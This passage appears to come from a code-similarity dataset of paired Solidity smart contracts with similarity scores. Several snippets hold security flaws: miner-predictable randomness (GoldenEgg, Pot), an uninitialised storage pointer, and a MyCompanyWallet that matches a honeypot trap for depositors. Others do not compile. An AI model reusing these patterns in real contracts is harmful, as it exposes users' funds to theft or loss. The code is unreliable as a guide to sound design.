    }

    function() {
        throw;
    }

    function Caller(bytes _email) {

        
        minter= msg.sender;
        email= _email;
    }

    function proxyRequest(address _target, string _payload) onlyOwner public {

        SendingTransaction(_target, 1);
        

        if (!_target.call(""registrationRequest"",_target, _payload))
        {
            SendingTransaction(_target, 2);
            
        }
        else
        {
            SendingTransaction(_target, 3);
            
        }


    }

}",0.6132606804778098,"contract WishingWell {



    event wishMade(address indexed wisher, string wish, uint256 amount);

    

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(

            msg.sender == owner,

            ""Only owner can call this function.""

        );

        _;

    }



    function changeOwner(address new_owner) public onlyOwner {

        owner = new_owner;

    }

    

    function makeWish(string wish) public payable {

        emit wishMade(msg.sender, wish, msg.value);

    }

    

    function withdrawAll() public onlyOwner {

        address(owner).transfer(address(this).balance);

    }

    

}"
"contract HouseholdFactory{
    address[] public deployedHouseholds;
    mapping (address => uint) public balances;
    address public owner;

    constructor() public{
        owner = address(this);
    }

    function createHousehold(uint capacity ) public{
        address newHousehold = new Household(capacity, msg.sender, owner);
        deployedHouseholds.push(newHousehold);
    }

    function getDeployedHouseholds() public view returns (address[]) {
        return deployedHouseholds;
    }
}",0.6101814544909776,"contract Tokendeployer {
  address owner;
  address public factory;

  function Tokendeployer(address _factory) public {
    factory = _factory;
    owner = msg.sender;
  }

  function newToken() public returns (address created) {
    require(msg.sender == factory);
    address new_token = new DRCT_Token(factory);
    return new_token;
  }

   function setVars(address _factory, address _owner) public {
    require (msg.sender == owner);
    factory = _factory;
    owner = _owner;
  }
}"
"contract Household{

uint public demand;
uint public supply;
uint public batteryCapacity;
uint public amountOfCharge;
uint public excessEnergy;



struct Bid{
    address origin;
    uint price;
    uint amount;
    uint date;
}

Bid[] public Bids;
Bid[] public Asks;
address public owner;
address public contractAddress;
address public parent;
address public exchangeAddress;
uint public balanceContract;
Exchange ex;


constructor(uint capacity, address creator, address watch_address) public {
    owner = creator;
    batteryCapacity = capacity;
    parent = watch_address;
    contractAddress = address(this);
}

function deposit() public payable {
}

function () public payable {}

function getBids(uint index) public view returns(address, uint, uint, uint){
    return (Bids[index].origin,
            Bids[index].price,
            Bids[index].amount,
            Bids[index].date
    );
}

function getAsks(uint index) public view returns(address, uint, uint, uint){
    return (Asks[index].origin,
            Asks[index].price,
            Asks[index].amount,
            Asks[index].date
    );
}

function setExchange(address exchange) public {
    exchangeAddress = exchange;
}

function charge(uint amount) public {
    require(msg.sender == owner);
    amountOfCharge += amount;
}

function discharge(uint amount) public {
    require(msg.sender == owner);
    amountOfCharge -= amount;
}

function submitBid(uint price, uint amount) public {
    Bid memory newBid = Bid({
        origin: contractAddress,
        price: price,
        amount: amount,
        date: now
    });

    Bids.push(newBid);
    ex = Exchange(exchangeAddress);
    ex.submitBid(price, amount);
}

function submitAsk(uint price, uint amount) public {
    Bid memory newAsk = Bid({
        origin: contractAddress,
        price: price,
        amount: amount,
        date: now
    });

    Asks.push(newAsk);
    ex = Exchange(exchangeAddress);
    ex.submitAsk(price, amount);
}

function buyEnergy(uint amount, address recipient, uint price ) external payable returns(bool successful){
    require(address(this).balance < price);

    amountOfCharge += amount;

    recipient.transfer(price*amount/1000); 
    return true;
}

function sellEnergy(uint amount, address recipient, uint price ) public {

    if(amountOfCharge>amount){
        amountOfCharge -= amount;
    }

    recipient.transfer(price*amount/1000);
}

}",0.6052713352808817,"contract Bitcoiin is ERC20
{
    using SafeMath for uint256;
    string public constant symbol = ""B2G"";
    string public constant name = ""Bitcoiin"";
    uint8 public constant decimals = 10;
     
    uint256 public _totalSupply = 50000000 * 10 **10;     
    
    mapping(address => uint256) balances;   
    
    address public owner;

    
    mapping (address => mapping (address => uint)) allowed;
    
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    event LOG(string e,uint256 value);
    
    modifier onlyOwner() {
      if (msg.sender != owner) {
            revert();
        }
        _;
        }

    
    function Bitcoiin() public
    {
        owner = msg.sender;
        balances[owner] = _totalSupply; 
    }
    
    
    function totalSupply() public view returns (uint256 total_Supply) {
         total_Supply = _totalSupply;
     }
  
     
     function balanceOf(address _owner)public view returns (uint256 balance) {
         return balances[_owner];
     }
  
     
     function transfer(address _to, uint256 _amount)public returns (bool success) {
         require( _to != 0x0);
         require(balances[msg.sender] >= _amount 
             && _amount >= 0
             && balances[_to] + _amount >= balances[_to]);
             balances[msg.sender] = balances[msg.sender].sub(_amount);
             balances[_to] = balances[_to].add(_amount);
             Transfer(msg.sender, _to, _amount);
             return true;
     }
  
     
     
     
     
     
     
     function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     )public returns (bool success) {
        require(_to != 0x0); 
         require(balances[_from] >= _amount
             && allowed[_from][msg.sender] >= _amount
             && _amount >= 0
             && balances[_to] + _amount >= balances[_to]);
             balances[_from] = balances[_from].sub(_amount);
             allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
             balances[_to] = balances[_to].add(_amount);
             Transfer(_from, _to, _amount);
             return true;
             }
 
     
     
     function approve(address _spender, uint256 _amount)public returns (bool success) {
         allowed[msg.sender][_spender] = _amount;
         Approval(msg.sender, _spender, _amount);
         return true;
     }
  
     function allowance(address _owner, address _spender)public view returns (uint256 remaining) {
         return allowed[_owner][_spender];
   }
   
   	
	function transferOwnership(address newOwner)public onlyOwner
	{
	    require( newOwner != 0x0);
	    balances[newOwner] = balances[newOwner].add(balances[owner]);
        Transfer(0, newOwner, balances[owner]);
	    balances[owner] = 0;
	    owner = newOwner;
        
	}
	
    
}"
"contract Test{
    int256[] public test;

    function setTest(int256 b) public{
        test.push(b);
    }

    function setTest2(uint256 a, int256 b) public {
        test[a] = b;
    }
}",0.6294979784120439,"contract test {
  using SafeMath for uint256;
  uint256 public num;
  function test() {
    num = 10;
  }
  function add(uint256 _num) {
    num = num.add(_num);
  }
}"
"contract TestConst{
    uint public a = 10;

    function constantFnA() constant returns (uint) {
        return  a+5;
    }

    
    
    function const_NonConst_A(){
        a = constantFnA();
    }

    
    
    function nonConst_A(){
        a = a+5;
    }
}",0.6220114226124693,"contract FinalizeAgent {

  function isFinalizeAgent() public constant returns(bool) {
    return true;
  }

  
  function isSane() public constant returns (bool);

  
  function finalizeCrowdsale();

}"
"contract test
{

uint[] values = [1,2,3,4,5,6];

function removeValueFromArray(uint _num) public returns(uint[]) {

    uint[] storage auxArray;

    for (uint i = 0; i < values.length; i++){
        if(values[i] != _num)
            auxArray.push(values[i]);
    }

    return auxArray;
}
}",0.6098425832181181,"contract Airdrop {

  

  function doAirdrop(address _tokenAddr, address[] dests, uint256[] values) public

    returns (uint256) {

    uint256 i = 0;

    while (i < dests.length) {

      ERC20(_tokenAddr).transferFrom(msg.sender,dests[i], values[i]);

      i += 1;

    }

    return(i);

  }

}"
"contract simple{

  address payable[] private addressIndex;
  uint price = 100;

  
  function distribute() private returns (uint) {

    uint amount = (address(this).balance-1) / addressIndex.length;
    for (uint i = 0; i < addressIndex.length; i++) {
      addressIndex[i].transfer(amount); 
    }
    return amount;
  }

  function () external payable {

    if ( msg.value != price ) { revert(); }
    addressIndex.push(msg.sender);
    distribute();
  }

}",0.6381342683946637,"contract Wallet is Ownable {



    event ReceiveEther(address indexed _sender, uint256 _value);

    event Pay(address indexed _sender, uint256 _value);



    function() external payable {

        emit ReceiveEther(msg.sender, msg.value);

    }



    function pay(address payable _beneficiary) public onlyOwner {

        uint256 amount = address(this).balance;

        _beneficiary.transfer(amount);

        emit Pay(_beneficiary, amount);

    }



}"
"contract sample{

    string name;
    uint age;

    function setName(string newName) {
        name=newName;
    }

    function getName()returns (string) {
        return name;
    }
}",0.6138941282104174,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract RecordStore{
  struct Record {
    string value;
    address owner;
  }

  mapping(string => Record) records;
  Record lastRecord;

  function addRecord(string _recordId, string _value, address _owner) returns (bool) {
    Record r = records[_recordId];
    r.value = _value;
    r.owner = _owner;
    lastRecord = r;
    return true;
  }

  function getLastRecordOwner() returns (addr) {
    return lastRecord.owner;
  }

}",0.6139436093967671,"contract HelloWorldContact {

	string word = ""Hello World"";

	address owner;

	

	function HelloWorldContract() {

		owner = msg.sender;

	}



	function getWord() constant returns(string) {

		return word;

	}



	function setWord(string newWord) constant returns(string) {

		if (owner !=msg.sender) {

			return 'You shall not pass';

		}

		word = newWord;

		return 'You successfully changed the variable word';

	}

}"
"contract GoldenEgg{
uint[] public spinHistory;


function spin() constant returns (uint) {
    uint spin = uint8(uint256(keccak256(block.timestamp, block.difficulty))%37);
    addToHistory(spin);
    return spin;
}

function getHistory() constant returns (uint[]) {
    return spinHistory;
}

function addToHistory( uint spin ) constant returns (uint[]) {
   spinHistory.push(spin); 
   return spinHistory;
}}",0.6182428213179021,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() returns (bool);
    function coinAge() constant returns (uint256);
    function checkPos() constant returns (uint256);
    function annualInterest() constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract TokenTransferContract{

using SafeMath for uint256;

address _owner;
address _tokenAddress;
ERC20Basic erc20Instance;

constructor () public {

    _owner = msg.sender; 

}



function setTokenInstance(address _tokenContractAddress) public {

    _tokenAddress = _tokenContractAddress;
    erc20Instance = ERC20Basic(_tokenContractAddress);

}



function transferContractTokenToOwner(uint256 _tokenAmount) public {
    require(_owner == msg.sender);

    erc20Instance.transfer(_owner, _tokenAmount); 

}

function getAmountOfTokenOfOwner() view public returns (uint256 _amount){
    require(_owner == msg.sender);

    _amount = (erc20Instance.balanceOf(_owner)).div(1000000000000000000);

}

function getAmountOfTokenOfContract() view public returns (uint256 _amount){

    require(_owner == msg.sender);

    _amount = (erc20Instance.balanceOf(address(this))).div(1000000000000000000);

}

 function noneDecimalGetAmountOfTokenOfOwner() view public returns (uint256 _amount){
    require(_owner == msg.sender);

    _amount = erc20Instance.balanceOf(_owner);

}

function noneDecimalgetAmountOfTokenOfWalletContract() view public returns (uint256 _amount){
    require(_owner == msg.sender);

    _amount = erc20Instance.balanceOf(address(this));

}


function getOwnerAddress() view public returns (address _ownerAddress){
    _ownerAddress = _owner;

}

function getContractAddress() view public returns (address _contractAddress){
    _contractAddress = address(this);

}

function getContractInstanceAddress() view public returns (address _contractInstanceAddress){ 
    _contractInstanceAddress = _tokenAddress;

}

}",0.6555279223317947,"contract _ERC20Pool {
  address constant public bitcoinContract = 0xB6eD7644C69416d67B522e20bC294A9a9B405B31;
    
  ERC20Interface public tokenContract = ERC20Interface(bitcoinContract);

  address public owner = msg.sender;
  uint32 public totalTokenSupply;
  mapping (address => uint32) public minerTokens;
  mapping (address => uint32) public minerTokenPayouts;

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  modifier hasTokens(address sentFrom) {
    require(minerTokens[sentFrom] > 0);
    _;
  }

  
  function addMinerTokens(uint32 totalTokensInBatch, address[] minerAddress, uint32[] minerRewardTokens) public onlyOwner {
    totalTokenSupply += totalTokensInBatch;
    for (uint i = 0; i < minerAddress.length; i ++) {
      minerTokens[minerAddress[i]] += minerRewardTokens[i];
    }
  }
  
  
  function withdraw() public
    hasTokens(msg.sender) 
  {
    uint32 amount = minerTokens[msg.sender];
    minerTokens[msg.sender] = 0;
    totalTokenSupply -= amount;
    minerTokenPayouts[msg.sender] += amount;
    tokenContract.transfer(msg.sender, amount);
  }

  
  function getBalance(address acc) public returns (uint32) {
      return minerTokens[acc];
    }
  
  
  
  function getPayouts(address acc) public returns (uint32) {
      return minerTokenPayouts[acc];
  }
  
  
  
  function () public payable {
    revert();
  }
  
  
  function withdrawEther(uint32 amount) onlyOwner {
    owner.transfer(amount);
  }
  
  
  function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
    if(tokenAddress == bitcoinContract ){ 
        revert(); 
    }
    return ERC20Interface(tokenAddress).transfer(owner, tokens);
  }

}"
"contract financialContracts4{

     address issuer; constructor() public{    issuer = msg.sender; }
     modifier ifIssuer(){    if(issuer != msg.sender){
           revert();    }else {
             _;
function receiveFunds( )public payable{
         } 
function getValue() public view returns(uint) {   address myAddress = this; return myAddress.balance; } 
function withdrawFunds(uint funds) ifIssuer{   issuer.transfer(funds); } }
",0.6599795669634206,"contract Ownable {

    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }

    function setOwner(address payable _owner) public onlyOwner {
        owner = _owner;
    }

    function getOwner() public view returns (address payable) {
        return owner;
    }

    modifier onlyOwner {
        require(msg.sender == owner, ""must be owner to call this function"");
        _;
    }

}"
"contract MultiplyContract{
    address public sender;
    address public receiver;
    uint public price;
    function MultiplyContract(
      address _sender,
      address _receiver,
      uint _price
      ){
      sender = _sender;
      receiver = _receiver;
      price = _price;
    }
    function Execution(){
      
    }
    function () {
      throw;
    }
}",0.6821562712340619,"contract Token {

	function transferFrom(address sender, address receiver, uint amount) public returns(bool success);



	function transfer(address receiver, uint amount) public returns(bool success);



	function balanceOf(address holder) public view returns(uint);

}"
"contract ethTransfer 
{
    address public creator;
    mapping (address => uint) public balances;

    event Sent(address from, address to, uint amount);

    constructor() public {
        creator = msg.sender;
    }

    function update(uint newBalance) public {
        balances[msg.sender] = newBalance;
    }

    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }
}",0.6871823242779715,"contract BasicToken is ERC20Basic {

    using SafeMath for uint;



    mapping(address => uint) balances;



  

    function transfer(address _to, uint _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



  

    function balanceOf(address _owner) public view returns (uint balance) {

        return balances[_owner];

    }



}"
"contract SendableERC20{

 struct Transfer {
    address contract_;
    address to_;
    uint amount_;
    bool failed_;
 }
 mapping(address => uint[]) public transactionIndexesToSender;

 Transfer[] public transactions;
 address public owner;
 address invalidTo_; 
 mapping(string => address) tokens;
 IERC20 public IERC20Interface;
 event TransferSuccessful(address indexed from_, address indexed to_, uint256 amount_);

 event TransferFailed(address indexed from_, address indexed to_, uint256 amount_);

 constructor() public {
    owner = msg.sender;
 }
 function addNewToken(string symbol_, address address_) public onlyOwner returns(bool){
    tokens[symbol_] = address_;

    return true;
 }

 function removeToken(string symbol_) public onlyOwner returns(bool){
    require(tokens[symbol_] != 0x0);

    delete(tokens[symbol_]);

    return true;
 }
 function returnSymbol(string symbol_)public view returns(address){
    return(tokens[symbol_]);
 }
 function transferTokens(string symbol_, address to_, uint256 amount_) public {
    require(tokens[symbol_]!= 0x0);
    require(amount_ > 0);

    address contract_ = tokens[symbol_];
    address from_ = msg.sender;

    IERC20Interface = IERC20(contract_);

    uint256 transactionId = transactions.push(
        Transfer({
            contract_: contract_,
            to_: to_,
            amount_: amount_,
            failed_: true
        }));

    transactionIndexesToSender[from_].push(transactionId -1);

    if(amount_ > IERC20Interface.allowance(from_, address(this))){
        emit TransferFailed(from_, to_, amount_);
        revert();
    }

    IERC20Interface.transferFrom(from_, to_, amount_);

    transactions[transactionId -1].failed_ = false;

    emit TransferSuccessful(from_, to_, amount_);
 }
 modifier onlyOwner(){
    require(msg.sender == owner);
    _;
 }



}",0.6994315118075237,"contract ERC20 {

    using SafeMath for uint256;



    string public name;

    string public symbol;

    uint8 public decimals = 18;

    uint public totalSupply;

    mapping (address => uint) public balanceOf;

    mapping (address => mapping (address => uint)) public allowance;



    event Created(uint time);

    event Transfer(address indexed from, address indexed to, uint amount);

    event Approval(address indexed owner, address indexed spender, uint amount);

    event AllowanceUsed(address indexed owner, address indexed spender, uint amount);



    constructor(string _name, string _symbol)

    public

    {

        name = _name;

        symbol = _symbol;

        emit Created(now);

    }



    function transfer(address _to, uint _value)

    public

    returns (bool success)

    {

        return _transfer(msg.sender, _to, _value);

    }



    function approve(address _spender, uint _value)

    public

    returns (bool success)

    {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    

    

    function transferFrom(address _from, address _to, uint256 _value)

    public

    returns (bool success)

    {

        address _spender = msg.sender;

        require(allowance[_from][_spender] >= _value);

        allowance[_from][_spender] = allowance[_from][_spender].sub(_value);

        emit AllowanceUsed(_from, _spender, _value);

        return _transfer(_from, _to, _value);

    }



    

    

    function _transfer(address _from, address _to, uint _value)

    private

    returns (bool success)

    {

        require(balanceOf[_from] >= _value);

        require(balanceOf[_to].add(_value) > balanceOf[_to]);

        balanceOf[_from] = balanceOf[_from].sub(_value);

        balanceOf[_to] = balanceOf[_to].add(_value);

        emit Transfer(_from, _to, _value);

        return true;

    }

}"
"contract Called{
    uint public myuint;

    function myuint() public view returns(uint _myuint) {
        _myuint = myuint;
    }

    function set(uint _var) public {
        myuint = _var;
    }

    function get() public view returns (uint){
        return myuint;
    }
}",0.6696265808419752,"contract Example is Upgradeable {
    uint _value;
    
    function initialize() public {
        _sizes[bytes4(keccak256(""getUint()""))] = 32;
    }
    
    function getUint() public view returns (uint) {
        return _value;
    }
    
    function setUint(uint value) public {
        _value = value;
    }
}"
"contract financialContracts3{

address issuer;
constructor() public{
   issuer = msg.sender;
}
modifier ifIssuer(){
   if(issuer != msg.sender){
      revert();
   }else {
        _;
   }
}
function receiveFunds( )public payable{

}
function getValue() public constant {
   return issuer.balance;
}
}",0.6577474245393377,"contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}"
"contract Betting is usingOraclize{
            address public player_;
            uint256 public betamount_;
            uint public winningamount_;
            uint private balance_;
            uint public betnumber_;
            uint public winningnumber_;
            uint public result_;
            string private question_;

        event LogNewOraclizeQuery(string description);
        event WinningNumber(uint winningnumber_);
        event BetResult(string result_);
        event Log( string mystring_);

        mapping (address => uint256) public balances;

        
        

        
        function checkBalance (address player_, uint betamount_) private returns (bool isSuccess) {

        
            Log (""Checking players balance"");
            require(player_.balance >= betamount_);

        
            Log (""Checking host's balance"");
            require (msg.sender.balance >= 10*(betamount_));    

            Log (""Validation pass"");
            return true;

        }

        function executeBetting (address player_, uint betamount_, uint betnumber_ ) public payable
             returns(uint answer_, string result_) {

        
            checkBalance(player_, betamount_);
            require (true); 

        
             question_ = ""random number between 2 and 12"";
             askOraclize (question_);


        

                if (betnumber_ ==  winningnumber_){
                    winningamount_ = 10e18;
                    player_.transfer(winningamount_);
                    result_ = 'You are lucky and have Won 1 Ether';
                }else
                if (betnumber_ !=  winningnumber_){ 
                    balances[player_] -= betamount_;
                    balances[msg.sender] += betamount_;
                    result_ = 'You lost';
                   }
                WinningNumber(winningnumber_);
                BetResult(result_);
                answer_ = winningnumber_;
        }


        
          
            function askOraclize(string question_) public payable{
             if (oraclize_getPrice(""WolframAlpha"") > this.balance) {
                 LogNewOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
                }else{
                 LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");    
                 oraclize_query(""WolframAlpha"", question_);
                }
            }    



            
              function __callback(
                bytes32 _myid,
                string _result,
                bytes _proof
              ) public
                  {
                    require(msg.sender == oraclize_cbAddress());
                    winningnumber_ = parseInt(_result); 
            }

        }",0.6168994707095012,"contract Pot {

	address public owner;
    address[] public potMembers;
    
	uint public potSize = 0;
	uint public winnerIndex;
	address public winnerAddress;
	uint public minBetSize = .01 ether;
	uint public potTime = 86400;
	uint public endTime = now + potTime;
	uint public totalBet = 0;

	bool public locked = false;
	
	event potSizeChanged(
        uint _potSize
    );
	
	event winnerAnnounced(
	    address winner,
	    uint amount
	);
	
	event timeLeft(uint left);
	
	event debug(string msg);
	
	function Pot() {
		owner = msg.sender;
	}

	
	
	
	
	
	
	
	function bytesToString (bytes32 data) returns (string) {
        bytes memory bytesString = new bytes(32);
        for (uint j=0; j<32; j++) {
            byte char = byte(bytes32(uint(data) * 2 ** (8 * j)));
            if (char != 0) {
                bytesString[j] = char;
            }
        }
        return string(bytesString);
    }
	
	
	function joinPot() public payable {
	    
	    assert(now < endTime);
        
	    for(uint i = msg.value; i >= minBetSize; i-= minBetSize) {
	        potMembers.push(msg.sender);
	        totalBet+= minBetSize;
	        potSize += 1;
	    }
	    
	    potSizeChanged(potSize);
	    timeLeft(endTime - now);
	    
	}

	function getPlayers() constant public returns(address[]) {
		return potMembers;
	}
	
	function getEndTime() constant public returns (uint) {
	    return endTime;
	}
	
    function rewardWinner() public payable {
        
        
        debug(""assert now > end time"");
        assert(now > endTime);
        if(!locked) {
            locked = true;
            debug(""locked"");
            if(potSize > 0) {
            	
            	if(potMembers.length == 1) 
            		random_number = 0;
            	else
                	uint random_number = uint(block.blockhash(block.number-1))%potMembers.length - 1;
                winnerIndex = random_number;
                winnerAddress = potMembers[random_number];
                uint amountWon = potSize * minBetSize * 98 / 100;
                
                
                winnerAnnounced(winnerAddress, amountWon);
                potMembers[random_number].transfer(amountWon); 
                owner.transfer(potSize * minBetSize * 2 / 100);
            }
            else {
                winnerAnnounced(0x0000000000000000000000000000000000000000, 0);
            }
            
            potSize = 0;
            endTime = now + potTime;
            timeLeft(endTime - now);
            delete potMembers;
            locked = false;
        }
        
    }

}"
"contract habibconcert{

  uint  public tickets = 6;

  address owner_of_tickets;

  uint constant price = 1 ether;

   mapping(address=>uint) public purchasers;

  function habibconcert()payable{

        owner_of_tickets =  msg.sender;
  }


function  displayTickets_numbers()constant returns(uint){

    return tickets;


}

    modifier ownLycreature(){


        require(msg.sender ==  owner_of_tickets) ;

        
        _;

        }



               function changeTickets_number (uint newtickets) ownLycreature{

                     tickets +=newtickets;

               }




function buytickets(uint amount)payable{

      if(msg.value!=(amount*price) || amount>tickets){

          throw;
      }

      purchasers[msg.sender] +=amount;

      tickets -=amount;


    

    

    


}        


}",0.6385400333602352,"contract CRTLotto is Owned {

    uint public ticketPrice;

    uint public totalTickets;



    mapping(uint => address) public tickets;



    constructor() public {

        ticketPrice = 0.01 * 10 ** 18;

        totalTickets = 0;

    }

    

    function setTicketPrice(uint _ticketPrice) external onlyOwner {

        ticketPrice = _ticketPrice;

    }

    

    function() payable external {

        uint ethSent = msg.value;

        require(ethSent >= ticketPrice);

        

        tickets[totalTickets] = msg.sender;

        totalTickets += 1;

    }

    

    function resetLotto() external onlyOwner {

        totalTickets = 0;

    }

    

    function withdrawEth() external onlyOwner {

        owner.transfer(address(this).balance);

    }

}"
"contract Gizmo
{
    int public value;
    function Gizmo(int v) {
        value = v;
    }
}",0.6296524778255842,"contract ERC20 {

  function transfer(address to, uint value) public;

}"
"contract Factory
{
    address gizmoAddr;
    function Create(int _value) returns (address) {
        gizmoAddr = new Gizmo(_value);
        return gizmoAddr;
    }
}",0.6238671544180118,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value) public pure returns(address) {

       if (_value != 0) return _from;

    }

}"
"contract Damble is usingOraclize{
using SafeMath for uint256;

mapping(address => uint) public users;
mapping(uint => bool) private allowedValues;
address[] public userAddresses;
uint[] public partAmounts;
address owner;

uint minEther;
uint public totalEth;
uint maxUsers;
uint maxValue = 5 ether;
uint public randomNumber;
function Damble() {
    owner = msg.sender;
    minEther = 0.5 ether;

    
    allowedValues[(1 ether / 100)] = true;
    allowedValues[(1 ether / 10)] = true;
    allowedValues[(1 ether / 4)] = true;
    allowedValues[(1 ether / 2)] = true;
    allowedValues[(1 ether)] = true;
    allowedValues[(5 ether)] = true;
}

event NewUser(address userAddress, uint amount);
event WinnerPicked(address winner);
event NewRandomNumber_bytes(bytes);
event NewRandomNumber_uint(uint);
event ProofFailed();


function placeBet() public payable{
    require(msg.value <= maxValue && msg.value > 0);
    require(allowedValues[msg.value]);

    if (users[msg.sender] > 0) {
        userPullout(); 
    }

    
    userAddresses.push(msg.sender);
    partAmounts.push(msg.value);
    totalEth = SafeMath.add(msg.value, totalEth);
    users[msg.sender] = msg.value;
    NewUser(msg.sender, msg.value);
}


function getPartAmounts() view public returns(uint[]){
    return partAmounts;
}

function getUserBalance(address user) view public returns(address, uint){
    return(user, users[user]);
}

function accountAmount() view public returns(uint) {
    uint arrLen = 0;
    for (uint i = 0; i < userAddresses.length; i++) {
        if (users[userAddresses[i]] > 0){
            arrLen++;
        }
    }
    return arrLen;
}

function minEthIsMet() view public returns(bool){
    return (totalEth >= minEther);
}

function userPullout() private {
    require(users[msg.sender] > 0);
    for (uint i = 0; i < userAddresses.length; i++) {
        if (userAddresses[i] == msg.sender){
            delete userAddresses[i];
            delete partAmounts[i];
        }
    }

    totalEth = SafeMath.sub(totalEth, users[msg.sender]);
    msg.sender.transfer(users[msg.sender]);
    users[msg.sender] = 0;
}


function pickWinner(uint randomNumber) view private returns(address){
    uint lastMax = 1;

    for (uint i = 0; i < userAddresses.length; i++) {
        if (randomNumber >= lastMax && randomNumber <= (users[userAddresses[i]] + lastMax)){
            WinnerPicked(userAddresses[i]);
            return (userAddresses[i]);
        }
        lastMax =  SafeMath.add(users[userAddresses[i]], lastMax);
    }
}



function endRaffle() public{
    require(msg.sender == owner);
    require(accountAmount() > 1);
    require(totalEth >= minEther);

    address winner = pickWinner(randomNumber);
    if (winner == address(0)){
        onNoAddress();
    } else {
        uint winnings; 
        if (SafeMath.div((SafeMath.mul(totalEth, 98)), 100) > this.balance) {
            winnings = SafeMath.div((SafeMath.mul(totalEth, 98)), 100);
        } else {
            winnings = SafeMath.div((SafeMath.mul(this.balance, 98)), 100);
        }

        winner.transfer(winnings);
        owner.transfer(address(this).balance);
    }
    totalEth = 0;
    clearParticipants();
}

function getContractBalance() public view returns(uint){
    return address(this).balance;
}

function clearParticipants() private {
    for (uint i = 0; i < userAddresses.length; i++) {
        users[userAddresses[i]] = 0;
        delete userAddresses[i];
        delete partAmounts[i];
    }
}

function onNoAddress() private{
    for (uint i = 0; i < userAddresses.length; i++) {
        userAddresses[i].transfer(users[userAddresses[i]]);
        users[userAddresses[i]] = 0;
    }
}



function __callback(bytes32 _queryId, string _result, bytes _proof)
{ 
    if (msg.sender != oraclize_cbAddress()) throw;

    if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {
        ProofFailed();
        
    } else {
        
        uint maxRange = totalEth -1; 
        randomNumber = (uint(sha3(_result)) % maxRange) + 1; 

        NewRandomNumber_uint(randomNumber); 
    }
}

function getRandomNumber() payable { 
    require(msg.sender == owner);
    require(accountAmount() > 1);
    require(totalEth >= minEther);

    oraclize_setProof(proofType_Ledger); 
    uint N = 4; 
    uint delay = 0; 
    uint callbackGas = 200000; 
    bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas);
}

}",0.6527634174036917,"contract TrineChain is ERC20 {
    
    using SafeMath for uint256; 
    address owner = msg.sender; 

    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => uint256) locknum; 

    string public constant name = ""TrineChain"";
    string public constant symbol = ""TRCON"";
    uint public constant decimals = 18;
    uint256 _Rate = 10 ** decimals;    
    uint256 public totalSupply = 1000000000 * _Rate;
    


    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Locked(address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

     function TrineChain() public {
        balances[owner] = totalSupply;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0) && newOwner != owner) {
             owner = newOwner;   
        }
    }


    function lock(address _to, uint256 _amount) private returns (bool) {
        require(owner != _to);
        require(_amount >= 0);
        require(_amount * _Rate  <= balances[_to]);
        locknum[_to]=_amount * _Rate;
        Locked(_to, _amount * _Rate);
        return true;
    }

    function locked(address[] addresses, uint256[] amounts) onlyOwner public {

        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        
        for (uint8 i = 0; i < addresses.length; i++) {
            lock(addresses[i], amounts[i]);
        }
    }

    function distr(address _to, uint256 _amount) private returns (bool) {
        require(owner != _to);
        require(_amount > 0);
        require(balances[owner] >= _amount * _Rate);

        balances[owner] = balances[owner].sub(_amount * _Rate);
        balances[_to] = balances[_to].add(_amount * _Rate);
        locknum[_to] += lockcheck(_amount) * _Rate;
        
        Transfer(owner, _to, _amount * _Rate);
        return true;
    }

    function lockcheck(uint256 _amount) internal pure returns (uint256) {
        if(_amount < 3000){
        return _amount * 4/10;
        }
        if(_amount >= 3000 && _amount < 10000){
        return _amount * 5/10;
        }
        if(_amount >= 10000 && _amount < 50000){
        return _amount * 6/10;
        }
        if(_amount >= 50000 && _amount < 500000){
        return _amount * 7/10;
        }
        if(_amount >= 500000){
        return _amount * 8/10;
        }
    }
    
    function distribute(address[] addresses, uint256[] amounts) onlyOwner public {

        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        
        for (uint8 i = 0; i < addresses.length; i++) {
            distr(addresses[i], amounts[i]);
        }
    }

    function lockedOf(address _owner) constant public returns (uint256) {
        return locknum[_owner];
    }

    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        require(_amount <= balances[msg.sender].sub(locknum[msg.sender]));
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
